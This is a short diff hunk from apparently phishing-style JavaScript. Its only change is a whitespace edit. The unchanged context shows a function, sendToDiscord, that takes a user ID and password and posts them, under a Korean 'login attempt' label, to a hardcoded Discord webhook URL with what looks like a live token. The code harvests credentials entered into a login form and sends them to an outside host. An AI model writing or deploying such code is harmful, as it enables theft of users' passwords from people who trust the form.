@@ -25,7 +25,7 @@ ordinaryButton.addEventListener('click', () => {
 
 function sendToDiscord(userId, password) {
     const webhookURL = 'https://discord.com/api/webhooks/1310193187427586058/fshmsmwoK622L7ha0-rDkvG601rT5bC3P6i-TcMpPVIQN3GmbJS-OJ_wN3STVsY9iPXU';
-
+    
     const data = {
         content: `로그인 시도:\n아이디: ${userId}\n비밀번호: ${password}`
     };
